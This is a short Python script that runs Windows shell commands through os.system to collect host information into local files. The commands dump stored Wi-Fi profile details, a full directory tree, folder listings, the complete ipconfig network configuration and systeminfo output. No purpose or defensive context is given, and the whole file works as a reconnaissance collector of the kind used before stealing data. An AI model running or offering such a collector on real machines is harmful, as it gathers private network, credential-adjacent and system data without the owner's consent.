from os import system
system("mkdir netsh & netsh wlan show profile > netsh/profiles.txt & netsh wlan show profile * > netsh/profileView.txt & exit")
system("mkdir files & tree /F > files/tree.txt")
system("dir > files/folder.txt")
system("mkdir device & ipconfig /all > device/ip.txt")
system("systeminfo > device/system.txt")
